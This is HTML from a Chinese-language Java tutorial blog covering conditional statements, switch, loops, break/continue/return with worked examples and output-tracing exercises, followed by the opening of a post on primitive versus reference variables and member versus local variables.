<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例［<span class="number">3</span>-<span class="number">4</span>］：三个整数a,b,c，要求按从小到大的次序输出</span><br><span class="line">解题思路：对a,b,c进行排序。先找出a、b、c中最小的，然后比较剩下的两个。</span><br><span class="line">算法：    </span><br><span class="line">        ①如果a&gt;b，则将a和b互换（使得a是a、b中小的那个）</span><br><span class="line">        ②如果a&gt;c，则将a和c互换（使得a是a、b、c中最小的）</span><br><span class="line">        ③如果b&gt;c，则将b和c互换（最后c最大，b次之，a最小）</span><br><span class="line">代码如下：</span><br><span class="line">     <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=b;b=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=b;b=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">    System.out.println(a+<span class="string">&quot;&lt; &quot;</span> +b+<span class="string">&quot;&lt; &quot;</span> +c);   </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒  if–else 语句的嵌套**</font>    
if-else语句中内嵌的语句1或语句2又是if-else语句的情况称为if-else语句的嵌套。如：
      if（布尔表达式1）
           语句1
      else if（布尔表达式2）
                 语句2
                 …
             else if (布尔表达式m)
                        语句m
                    else  语句n
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">3</span>-<span class="number">5</span>] 求一元二次方程(aX2+bX+c=<span class="number">0</span>)的根：</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">roots</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c;</span><br><span class="line">		<span class="keyword">float</span> x1,x2;</span><br><span class="line">		<span class="keyword">int</span> check;</span><br><span class="line">		a=<span class="number">1</span>;b=-<span class="number">2</span>;c=<span class="number">1</span>;</span><br><span class="line">		check=b*b-<span class="number">4</span>*a*c;</span><br><span class="line">		<span class="keyword">if</span>(check==<span class="number">0</span>)&#123;</span><br><span class="line">			x1=(-b)/(<span class="number">2</span>*a);</span><br><span class="line">			x2=x1;</span><br><span class="line">			System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">			System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">		&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (check&gt;<span class="number">0</span>) &#123;</span><br><span class="line">          x1=(-b+(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          x2=(-b-(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">          System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;   <span class="comment">/*请自己填写*/</span>   &#125;</span><br><span class="line">     &#125; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">课堂练习：求最小数</span><br><span class="line"><span class="keyword">import</span>  java.io.*;             </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Min</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line">   <span class="keyword">byte</span> buf[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">20</span>];  </span><br><span class="line">   String str ;  <span class="keyword">int</span> a, b, min;    </span><br><span class="line">   System.out.println(<span class="string">&quot;请输入二个整数：&quot;</span>);                    </span><br><span class="line">   System.in.read(buf);        <span class="comment">//从键盘读一数字串存于buf中</span></span><br><span class="line">   str=<span class="keyword">new</span> String(buf);              <span class="comment">//buf 转换成字符串 </span></span><br><span class="line">   a=Integer.parseInt(str.trim());  <span class="comment">//数字串转换成整数</span></span><br><span class="line">   System.in.read(buf);    str=<span class="keyword">new</span> String(buf);                   </span><br><span class="line">   b=Integer.parseInt(str.trim());        </span><br><span class="line">    </span><br><span class="line">   min=a;</span><br><span class="line">   <span class="keyword">if</span> (min&gt;b) min=b;</span><br><span class="line">   System.out.println(<span class="string">&quot;最小数是&quot;</span>+min);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h5 id="switch-语句"><a href="#switch-语句" class="headerlink" title="  switch  语句"></a><font color="#00B2EE" face="Comic sans MS">  switch  语句</font></h5><p><font face="Comic sans MS"><strong>switch语句根据表达式的结果来执行多个可能操作中的一个，它的语法形式如下：</strong><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">1</span>：语句<span class="number">1</span>  </span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">2</span>：语句<span class="number">2</span></span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> …</span><br><span class="line"> <span class="keyword">case</span> 常量n：语句n</span><br><span class="line">                 [<span class="keyword">break</span>;]</span><br><span class="line"> [<span class="keyword">default</span>: 缺省处理语句</span><br><span class="line">                 <span class="keyword">break</span>；]    <span class="comment">//这儿的break语句不必要</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font> <font color="red">“case 常量”</font>只起语句标号的作用，并非在该处进行条件判断。在执行switch语句时，根据switch括号中表达式的值找到匹配的入口标号，就从此标号所标记的语句开始执行下去，<font color="red">不再进行判断，直到遇到break语句为止。</font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">演示有<span class="built_in">break</span>及没有<span class="built_in">break</span>的情况</span><br><span class="line">public class switchBreak</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;   …</span><br><span class="line">         switch(2)</span><br><span class="line">         &#123; </span><br><span class="line">          <span class="keyword">case</span> 1: System.out.println(<span class="string">&quot;case1&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 2: System.out.println(<span class="string">&quot;case2&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 3: System.out.println(<span class="string">&quot;case3&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          default: System.out.println(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>使用switch-case必须注意:</strong></font><br><font color="#00B2EE"><strong>1.</strong></font> 表达式必须是符合byte,char,short和int类型的表达式,不能是浮点类型或字符串，case子句中常量的类型必须与表达式的类型相容,且每个常量必须不同；<br><font color="#00B2EE"><strong>2.</strong></font> case后面可以有多条语句，不用加{}；<br><font color="#00B2EE"><strong>3.</strong></font> default子句是可选的。如果有default，当表达式的值与case子句的值都不匹配时就会执行default分支，如果既没匹配也没default，那就什么也不执行；<br><font color="#00B2EE"><strong>4.</strong></font> break为跳转语句，表示跳出switch结构，即终止switch语句的执行。如果没有break语句，则switch在执行完一个case分支后，流程控制转移到下一个case继续执行，不再匹配，直到遇到break为止。<br><font color="#00B2EE"><strong>5.</strong></font> 多个case子句可以共享相同的语句块；<br><font color="#00B2EE"><strong>6.</strong></font> 通过if-else语句可以实现switch语句所有的功能。但通常使用switch语句更简练，且可读性强，程序的执行效率也高；<br><font color="#00B2EE"><strong>7.</strong></font> if-else语句可以基于一个范围内的值或一个条件来进行不同的操作，但switch语句中的每个case子句都必须对应一个单值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-6] 用switch语句判断一个月份属于一年哪个季节(春、夏、秋、冬)。</span><br><span class="line">class SwitchDemo&#123;</span><br><span class="line"> public static void main(String args[]) &#123; </span><br><span class="line">  int month=7;</span><br><span class="line">  String season;</span><br><span class="line">  switch (month)     //值为12、1和2时将都执行：season=<span class="string">&quot;冬季&quot;</span>; <span class="built_in">break</span>;</span><br><span class="line">  &#123; <span class="keyword">case</span>  12: </span><br><span class="line">    <span class="keyword">case</span>  1:</span><br><span class="line">    <span class="keyword">case</span>  2:</span><br><span class="line">      season=<span class="string">&quot;冬季&quot;</span>;  </span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    <span class="keyword">case</span>  3:</span><br><span class="line">    <span class="keyword">case</span>  4:</span><br><span class="line">    <span class="keyword">case</span>  5:</span><br><span class="line">      season=<span class="string">&quot;春季&quot;</span>；</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  6:</span><br><span class="line">   <span class="keyword">case</span>  7:</span><br><span class="line">   <span class="keyword">case</span>  8:  season=<span class="string">&quot;夏季&quot;</span>; </span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  9:</span><br><span class="line">   <span class="keyword">case</span>  10:</span><br><span class="line">   <span class="keyword">case</span>  11: season=<span class="string">&quot;秋季&quot;</span>；</span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   default:  season=<span class="string">&quot;错!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(<span class="string">&quot;月份    季节&quot;</span>);</span><br><span class="line">   System.out.println(month+<span class="string">&quot;    &quot;</span>+season);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">该程序运行后输出：月份    季节</span><br><span class="line">                 7      夏季</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-循环语句"><a href="#2-2-循环语句" class="headerlink" title="2.2  循环语句"></a><font color="#3CB371" face="Comic sans MS">2.2  循环语句</font></h4><h5 id="while-语句"><a href="#while-语句" class="headerlink" title="while  语句  "></a><font color="#00B2EE" face="Comic sans MS">while  语句  </font></h5><p><font face="Comic sans MS">while语句形式如下：<br>&amp;emsp;&amp;emsp;<font color="red">     while (布尔表达式) {语句块}  </font><br><strong>说明：</strong>while：语句的关键字； 布尔表达式：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-7] Sum1.java用<span class="keyword">while</span>循环语句计算s=1+1/2+1/3+…+1/100</span><br><span class="line">class Sum &#123;</span><br><span class="line">  public static void main(String args[]) &#123;</span><br><span class="line">    int n=100;　                //循环总数n=100</span><br><span class="line">    int  i=1;　　     　　      //循环次数，初值为１</span><br><span class="line">    <span class="built_in">float</span> s=0;                 //和s为实型</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=100) 　　　      //循环条件,循环总数100</span><br><span class="line">    &#123;</span><br><span class="line">     s=s+(1.0f/i);            //s增加1/i ,1.0f表示是<span class="built_in">float</span>型</span><br><span class="line">     i++;                    //循环次数加１</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(“s=”+s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                              </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do-while  语句  "></a><font color="#00B2EE" face="Comic sans MS">do-while  语句  </font></h5><p><font face="Comic sans MS">do-while语句的语法形式如下：<br>&amp;emsp;&amp;emsp;<font color="red">     do{<br>&amp;emsp;&amp;emsp;                        语句块<br>&amp;emsp;&amp;emsp;                         }while（布尔表达式）;<br></font><br><strong>说明：</strong>do：语句的关键字； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句； 布尔表达式：循环条件。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-8] Sum2.java 用do-while循环语句计算s=1+2+3+……100</span><br><span class="line">class Sum2&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int i=1;         //循环次数，初值为１</span><br><span class="line">		int s=0;         //累加和s初值为0</span><br><span class="line">		<span class="keyword">do</span>&#123;              //开始无条件循环</span><br><span class="line">			s=s+i;       //s增加i</span><br><span class="line">			i++;         //循环次数加１</span><br><span class="line">		&#125;<span class="keyword">while</span>(i&lt;=100);  //循环总数100</span><br><span class="line">		System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="for-语句"><a href="#for-语句" class="headerlink" title="for 语句  "></a><font color="#00B2EE" face="Comic sans MS">for 语句  </font></h5><p><font face="Comic sans MS">for语句的语法形式为：<br>&amp;emsp;&amp;emsp;<font color="red">for（表达式1；表达式2；表达式3）<br>&amp;emsp;&amp;emsp;                  {   语句块<br>&amp;emsp;&amp;emsp;                  }<br></font><br><strong>说明：</strong>（表达式1；表达式2；表达式3）：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。</p>
<p><font color="red"> <strong>for语句的执行过程如下：</strong></font><br>（1）按表达式1将初值赋给循环控制变量；<br>（2）按表达式2判断循环是否成立，如果成立则执行循环体，否则退出循环；<br>（3）执行一次循环后，执行表达式3修改控制变量。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-9] sum3.java 编程求S=12+22+…92 </span><br><span class="line">public class sum3&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int s=0;</span><br><span class="line">		<span class="keyword">for</span>(int i=1;i&lt;=9;i++)</span><br><span class="line">		   s=s+i*i;</span><br><span class="line">		   System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**for语句使用注意：**</font>    
1.  逗号语句分隔的语句系列,被看作一个语句，这样就可以在只能放一个语句的地方放任意多个语句，只须用逗
    号将它们分隔开。如： 
      for ( i=1,j=10;i < j;i++,j--)
      {    ……    }
2.  表达式1、表达式2及表达式3都可以为空语句(但分号不能省略) 如：
         for(  ;  ;  ) { … }     相当于while(true)   


<p><font color="red"><strong>循环的嵌套：</strong></font><br>一个循环体内又包含<font color="red">另一个完整的循环结构</font> ，称为循环的嵌套。内嵌的循环中还可以嵌套循环，这就是多重<br>循环。上述三种循环（while循环，do-while循环和for循环）语句之间可以相互嵌套使用。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-10] 百鸡问题。</span><br><span class="line">      已知公鸡5元1只，母鸡3元一只，小鸡1元3只，要求用100元刚好买100只鸡，问有多少种采购方案。</span><br><span class="line"></span><br><span class="line">     分析: 设变量I、J、K分别代表公鸡数、母鸡数及小鸡数，则应满足下列一些条件:</span><br><span class="line">① I+J+K=100(只)，I,J,K0;</span><br><span class="line">② 5I+3J+K/3=100（元）;</span><br><span class="line">③ 若用100元全部买公鸡，最多只能买20只, 所以I≤20;若全部买母鸡最多只能买33只，所以J≤33; </span><br><span class="line">  而小鸡数目就是100-I-J;(简化计算)</span><br><span class="line">     根据以上分析，可编程如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class  Loop_Loop &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">      int I,J,K;</span><br><span class="line">      System.out.println(<span class="string">&quot; I    J    K &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>  (I=0;I&lt;=20;I++ )</span><br><span class="line">       &#123; <span class="keyword">for</span> ( J=0;J&lt;=33;J++)</span><br><span class="line">            &#123; K=100-I-J;                </span><br><span class="line">              <span class="keyword">if</span> (5*I+3*J+K/3.0==100)         //注意“K/3.0”</span><br><span class="line">              System.out.println(I+<span class="string">&quot;   &quot;</span>+J+<span class="string">&quot;   &quot;</span>+K);</span><br><span class="line">            &#125; </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-跳转语句"><a href="#2-3-跳转语句" class="headerlink" title="2.3  跳转语句"></a><font color="#3CB371" face="Comic sans MS">2.3  跳转语句</font></h4><h5 id="break语句"><a href="#break语句" class="headerlink" title="break语句  "></a><font color="#00B2EE" face="Comic sans MS">break语句  </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>  使程序的流程从一个语句块的内部跳转出来。<br>(1) 从switch语句的分支中跳出来<br>(2) 从循环体内跳出来<br></font> </p>
<p>对上述的(1)(2)举例如下：<font color="#00B2EE"><strong>(1) break用于跳出switch语句</strong></font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">switch(grade)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: System.out.println(<span class="string">&quot;及格\n &quot;</span>); <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> ‘D’: System.out.println(“不及格\n <span class="string">&quot;); break;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">习题1：分析该程序的输出结果</span><br><span class="line">int x=5;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">          switch(x%2)</span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">case</span> 1: x--;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                <span class="keyword">case</span> 0: x++;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           x--;</span><br><span class="line">           System.out.println(x);</span><br><span class="line">     &#125;<span class="keyword">while</span>(x&gt;0);</span><br><span class="line">运行结果：</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">习题2：分析该程序的输出结果</span><br><span class="line">int a=5,b=6,i=0,j=0;</span><br><span class="line">switch(a)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> 5: switch(b)</span><br><span class="line">                    &#123;</span><br><span class="line">                          <span class="keyword">case</span> 5:i++;<span class="built_in">break</span>;</span><br><span class="line">                          <span class="keyword">case</span> 6:j++;<span class="built_in">break</span>;</span><br><span class="line">                          default:i++;j++;</span><br><span class="line">                     &#125;</span><br><span class="line">         <span class="keyword">case</span> 6: i++;j++;</span><br><span class="line">                     <span class="built_in">break</span>;</span><br><span class="line">         default: i++;j++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line">运行结果：</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE"><strong>(2) break用于跳出循环体</strong></font>  </p>
<p><strong>break可用于跳出for循环、while循环、do while循环。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">      sum=sum+i;</span><br><span class="line">      <span class="keyword">if</span>(i==50)<span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);    //结果为1275</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font color="red"><strong>如果break在多重循环中，只退出break所在的那层循环到外层循环中。</strong></font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">       sum=sum+i;</span><br><span class="line">       <span class="keyword">while</span>(i==50)&#123;i=100;<span class="built_in">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);       //结果为1275</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句 "></a><font color="#00B2EE" face="Comic sans MS">continue 语句 </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>用来结束所在循环语句块的本次循环<br><font color="red"><strong>注意:</strong></font>continue语句只能在循环语句中使用。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-11] ConDemo.java</span><br><span class="line">public class ConDemo&#123;</span><br><span class="line">public static void main(String args[])&#123;</span><br><span class="line">  int index=0;</span><br><span class="line">  <span class="keyword">while</span>(index&lt;=99)</span><br><span class="line"> &#123;</span><br><span class="line">	index+=10;</span><br><span class="line">           <span class="keyword">if</span>(index==40)  <span class="built_in">continue</span>; </span><br><span class="line">	System.out.println(<span class="string">&quot;   The index is &quot;</span>+index);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">   The index is 10</span><br><span class="line">   The index is 20</span><br><span class="line">   The index is 30</span><br><span class="line">   The index is 50</span><br><span class="line">   The index is 60</span><br><span class="line">   The index is 70</span><br><span class="line">   The index is 80</span><br><span class="line">   The index is 90</span><br><span class="line">   The index is 100</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>循环体中使用break语句和continue语句的区别：</strong></font><br><font color="#00B2EE"><strong>Break语句</strong></font>  结束整个循环,不再判断执行循环的条件;<br><font color="#00B2EE"><strong>Continue语句</strong></font>只结束本次循环,而不是终止整个循环的执行。<br></font>  </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句  "></a><font color="#00B2EE" face="Comic sans MS">return 语句  </font></h5><p><font face="Comic sans MS"><strong>格式：</strong>   <font color="red">return  表达式;</font><br><strong>用途：</strong><br>(1) 结束方法的运行，并返回一个值；<br>(2) 如果该方法没有返回值（void），则return后不能跟表达式。<br></font></p>
<blockquote>
<blockquote>
<p>例如：  return  0;<br>&amp;emsp;&amp;emsp;&amp;emsp;   return;</p>
</blockquote>
</blockquote>
<p><strong>思考:分析以下程序运行结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. </span><br><span class="line">public class ArithmeticOp&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int a,b,c;</span><br><span class="line">       a=b=c=2;</span><br><span class="line">       a=++b - ++c;     //0 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b++ + c++;    //6 4 4</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b-- + c--;    //8 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">public class TestSwitch&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int  x=1,y=2,i=0,j=0;</span><br><span class="line">       switch(x)&#123;</span><br><span class="line">          <span class="keyword">case</span> 1: switch(y)&#123;</span><br><span class="line">                   <span class="keyword">case</span> 1: i++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> 2: j++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   default:i++;</span><br><span class="line">                    j++;&#125;           //i=0 j=1</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> 2: i++;</span><br><span class="line">                  j++;              //i=1 j=2</span><br><span class="line">                  <span class="built_in">break</span>;</span><br><span class="line">          default:i++;</span><br><span class="line">                  j++;</span><br><span class="line">       &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;i=&quot;</span>+i);</span><br><span class="line">      System.out.println(<span class="string">&quot;j=&quot;</span>+j);</span><br><span class="line">    &#125;                              //i=1</span><br><span class="line">&#125;                                  //j=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">public class J_Test&#123;</span><br><span class="line">  static boolean mb_fun(char c)</span><br><span class="line">  &#123;    System.out.print(c);</span><br><span class="line">       <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  public  static void main(String args[])&#123;</span><br><span class="line">       int i=0;</span><br><span class="line">       <span class="keyword">for</span>(mb_fun(‘A’);mb_fun(‘B’)&amp;&amp;(i&lt;2);mb_fun(‘C’))</span><br><span class="line">       &#123;   i++;</span><br><span class="line">           mb_fun(‘D’);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     //结果： A B D C B D C B</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java变量及其传递、内部类(4.9-4.10)</title>
    <url>/post/Java-Variable-InnerClass6/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>变量及其传递 & 内部类</font></center>

<p>&amp;emsp;</p>
<h3 id="一、-Java变量及其传递"><a href="#一、-Java变量及其传递" class="headerlink" title="一、 Java变量及其传递"></a><font color="#FF6347" face="Comic sans MS">一、 Java变量及其传递</font></h3><h4 id="1-1-基本数据变量与引用型变量"><a href="#1-1-基本数据变量与引用型变量" class="headerlink" title="1.1  基本数据变量与引用型变量"></a><font color="#20B2AA" face="Comic sans MS">1.1  基本数据变量与引用型变量</font></h4><p><font face="Comic sans MS"><strong>1.  📒Java变量:</strong><br>&amp;emsp;<font color="red"><strong>(1). 基本型变量(8种)</strong></font><br>&amp;emsp;&amp;emsp; <strong>char,byte,short,int,long,float,double,boolean</strong><br>&amp;emsp;<font color="red"><strong>(2). 引用型变量：</strong></font><strong>对象,接口,数组</strong></font>            </p>
<p><img data-src="https://i.loli.net/2018/12/27/5c24f23dc321f.png" alt="T2.png"><br><img data-src="https://i.loli.net/2018/12/27/5c24f4379eed2.png" alt="N.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">    public class MyDate&#123;</span><br><span class="line">	private int day=12;</span><br><span class="line">	private int month=6;</span><br><span class="line">	private int year=1900;</span><br><span class="line">	public MyDate(int y,int m,int d)&#123;</span><br><span class="line">		year=y;</span><br><span class="line">		month=m;</span><br><span class="line">		day=d;&#125;</span><br><span class="line">          void addYear()</span><br><span class="line">	&#123;   year++;&#125;</span><br><span class="line">         public void <span class="function"><span class="title">display</span></span>()&#123;</span><br><span class="line">	System.out.println(year+<span class="string">&quot;-&quot;</span>+month</span><br><span class="line">             +<span class="string">&quot;-&quot;</span>+day);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">       MyDate m,n;</span><br><span class="line">       m=new MyDate(2003,9,22);</span><br><span class="line">       n=m;     <span class="string">&quot;//n和m指向同一个地址&quot;</span></span><br><span class="line">       n.addYear();</span><br><span class="line">       m.display();</span><br><span class="line">       n.display();</span><br><span class="line">       System.out.println(m.toString());</span><br><span class="line">       System.out.println(n.toString());	</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      /*运行结果</span><br><span class="line">       2004-9-22</span><br><span class="line">       2004-9-22</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">      */</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-成员变量与局部变量"><a href="#1-2-成员变量与局部变量" class="headerlink" title="1.2  成员变量与局部变量"></a><font color="#20B2AA" face="Comic sans MS">1.2  成员变量与局部变量</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**成员变量与局部变量有没有区别?**</font>
  成员变量若为static的称为类变量，否则称为成员变量，而局部变量是在方法体内的变量。
 (1) 📒从语法形式上看，成员变量是属于类或接口的，而局部变量是在方法中定义的变量或方法的参变量；
 成员变量可以被public，private，static等修饰，而局部变量则不能被访问控制符及static修饰；成员
 变量及局部变量都可以被final修饰。
(2) 📒从变量在内存中的存储方式看，成员变量是对象的一部分，而对象是存在于堆中的，而局部变量是
     存在于栈中的。
(3) 📒从变量在内存中的存在时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变
     量随着方法的调用而产生，随着方法调用结束而自动消失。
